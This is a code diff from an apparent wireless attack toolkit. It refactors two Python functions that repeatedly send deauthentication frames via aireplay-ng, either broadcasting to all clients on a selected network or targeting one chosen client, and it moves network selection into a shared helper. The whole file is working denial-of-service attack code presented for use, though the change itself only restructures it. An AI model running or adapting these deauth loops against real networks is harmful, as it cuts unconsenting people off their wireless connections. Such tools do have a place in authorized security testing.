@@ -10,17 +10,17 @@ from rich.prompt import Prompt
 from rich.table import Table
 
 from app.ui import BORDER_STYLE
+from app.services.runtime_helpers import require_selected_network
 from attacks.commands import aireplay_deauth
 
 
 def run_deauth_all_clients(app) -> None:
     """Deauthenticate all clients connected to the selected network."""
-    if not app.selected_network:
-        app.console.print("[bold red]Please select a target network first![/]")
+    record = require_selected_network(app)
+    if not record:
         return
-
-    network = app.networks[app.selected_network]
-    clients = network["clients"]
+    bssid, network = record
+    clients = list(network.get("clients") or [])
     if not clients:
         app.console.print("[bold yellow]No clients connected to this network.[/]")
         return
@@ -40,7 +40,7 @@ def run_deauth_all_clients(app) -> None:
             app.console.print(f"\n[bold yellow]--- Round {round_count} | Duration: {duration} ---[/]")
             app.console.print(f"[bold cyan]Broadcasting deauth to all clients on {network['ssid']}...[/]")
             subprocess.run(
-                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2),
+                aireplay_deauth(app.interface_name, bssid=bssid, count=2),
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
                 timeout=30,
@@ -48,7 +48,7 @@ def run_deauth_all_clients(app) -> None:
             app.console.print(f"[bold green]Targeting individual clients ({len(clients)}):[/]")
             for i, client in enumerate(clients, 1):
                 subprocess.run(
-                    aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=client),
+                    aireplay_deauth(app.interface_name, bssid=bssid, count=2, client=client),
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                     timeout=30,
@@ -68,12 +68,11 @@ def run_deauth_all_clients(app) -> None:
 
 def run_deauth_single_client(app) -> None:
     """Deauthenticate a specific client connected to the selected network."""
-    if not app.selected_network:
-        app.console.print("[bold red]Please select a target network first![/]")
+    record = require_selected_network(app)
+    if not record:
         return
-
-    network = app.networks[app.selected_network]
-    clients = network["clients"]
+    bssid, network = record
+    clients = list(network.get("clients") or [])
     if not clients:
         app.console.print("[bold yellow]No clients connected to this network.[/]")
         return
@@ -92,7 +91,7 @@ def run_deauth_single_client(app) -> None:
     )
     if choice == "0":
         return
-    selected_client = list(clients)[int(choice) - 1]
+    selected_client = clients[int(choice) - 1]
     start_time = time.time()
     packet_count = 0
 
@@ -106,7 +105,7 @@ def run_deauth_single_client(app) -> None:
             seconds = elapsed % 60
             duration = f"{minutes:02d}:{seconds:02d}"
             subprocess.run(
-                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=selected_client),
+                aireplay_deauth(app.interface_name, bssid=bssid, count=2, client=selected_client),
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
                 timeout=30,
